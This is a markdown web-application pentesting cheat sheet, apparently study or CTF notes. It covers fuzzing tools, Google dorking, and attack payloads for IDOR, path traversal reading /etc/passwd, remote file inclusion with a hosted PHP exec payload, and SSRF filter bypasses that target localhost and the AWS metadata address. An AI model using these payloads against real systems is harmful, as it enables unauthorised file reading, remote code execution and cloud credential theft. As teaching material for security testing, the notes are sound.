# Useful Programs

- ffuf/GoBuster/Dirb: Recursively request HTTP endpoints with different sub-pages or form values
- BurpSuite: HTTP(S) request related exploits
- RequestBin.com: Monitor HTTP requests on a site

## Command Syntaxes

### Curl

```bash
curl
  -X METHOD
  -F "FORM=DATA"
  -H "Content-Type: TYPE"
  -D "{JSON:DATA}"
  --url "URL"
```

### ffuf
```bash
ffuf
  -w WORDLIST
  -u https://example.com/FUZZ
  -X METHOD
  -d "json=FUZZ"
  -H "Content-Type: TYPE"
  -H "Cookie: name=value"
  -mr "match regex for valid"
  -fc FILTER_OUT_STATUS_CODE
```

### dirb
```bash
dirb
  https://example.com/ WORDLIST
```

### gobuster
```bash
gobuster
  dir 
  --url https://example.com/ 
  -w WORDLIST
```

## Discovery Methods

### Manual
- `robots.txt`: Contains directories not cached by search engines
- `favicon`: Could contain leftover framework build icon [https://wiki.owasp.org/index.php/OWASP_favicon_database]
- `sitemap.xml`: Contains all directories to be cached by search engines

### Google Dorking
- `site:example.com`
- `inurl:admin`
- `filetype:pdf`
- `intitle:admin`

### Wappalyzer
- [Wappalyzer](https://www.wappalyzer.com/): Automatically finds site frameworks, platforms, and libraries

### Automated
- See "Useful Programs"

## Attacks
### Insecure Direct Object Reference (IDOR)
Insecure Direct Object Reference - Changing parameter inputs to effect the returned value
#### Vulnerabilities and Exploits
- [example.com/profile?user_id=100](https://example.com/profile?user_id=100)
  - **Exploit:** [example.com/profile?user_id=1](https://example.com/profile?user_id=1)
#### Notes
- Could be encrypted in MD5, Base64, and other hashes

### LFI (Local File Inclusion)
Local File Inclusion - Accessing files in a PHP file server outside of the intended directory
- `/index.php?file=/etc/passwd` - Traditional
- `/index.php?file=../../etc/passwd` - Directory Based
- `/index.php?file=SubFolder/../../etc/passwd` - Sub-Folder Based
- `/index.php?file=../../etc/passwd0x00` - Null Byte 1
- `/index.php?file=../../etc/passwd%00` - Null Byte 2
- `/index.php?file=....//....//etc//passwd` - Filtered
#### Tips
- Try switching request methods

### RFI (Remote File Inclusion)
Remote File Inclusion - Runs PHP file from remote server [RCE]
- (Host PHP at [http://example.com/payload.txt](http://example.com/payload.txt))
  - `/index.php?file=http://example.com/payload.txt`
#### Quick Payload Hosting
```bash
echo "<?php
print exec('hostname');
?>" > payload.txt
python3 -m http.server
# Replace 0.0.0.0 with public IP
```

### SSRF (Server-Side Request Forgery)
Server-Side Request Forgery - Change request URLs to access different data or steal hidden headers
#### Vulnerabilities and Exploits
- https://example.com/form?server=http://api.example.com/req - Link
  - Exploit - https://example.com/form?server=http://api.example.com/admin
  - Requests - http://api.example.com/admin
- https://example.com/form?server=api - Subdomain
  - Exploit - https://example.com/form?server=api.example.com/admin?
  - Requests - http://api.example.com/admin?https://example.com/form
- https://example.com/member?path=/req - Path
  - Exploit - https://example.com/member?path=/../admin
  - Requests - http://api.example.com/admin
#### Defense Evasion
- Domain rewrites
  - [Rule denies if using a blocked subdomain (admin.example.com)]
  - localhost
  - 0.0.0.0
  - 127.0.0.1
  - 127.0.0.1.nip.io
- Fake Domain
  - [Rule only accepts if domain starts with example.com]
  - Host enemy API on example.com.yourdomain.com
- Open Redirect
  - [Rule only accepts if domain starts with example.com]
  - [https://example.com/link?url=https://anything.com redirects to https://anything.com]
  - Host enemy API at anything.com
- Sub-Directories
  - [Rule denies if page starts with /admin]
  - Request "/x/../admin"
#### Notes
- 169.254.169.254 - Contains Metadata on AWS Machines
